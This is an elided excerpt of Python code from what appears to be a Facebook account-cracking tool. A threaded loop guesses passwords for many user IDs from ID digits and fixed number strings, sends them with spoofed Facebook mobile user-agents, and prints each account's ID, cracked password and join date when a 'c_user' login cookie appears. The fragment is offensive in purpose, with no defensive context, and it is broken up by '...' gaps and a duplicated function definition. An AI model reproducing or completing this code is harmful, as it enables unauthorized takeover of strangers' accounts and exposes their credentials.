...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            ...
            mk = uid[:6]
            pwx = [love]
            pwx = [code+love,mk,'57273200' ,'59039200','57575751','57575752']
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]',}
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\033[1;96m[FACEBOOK]… [UID]{xd}  ')
                print(f'\033[1;93m[ PASSWORD ] … [🔑]{ps}  ')
                print(f'\033[1;92m[JOIN DATE ] …[📅 ] {Joined(xd)}  ')
                print(f'\033[1;37m==========================================================')               
                print(f'\033[1;95m[AGENT  ]…[ 💙 ] {pro}  ')
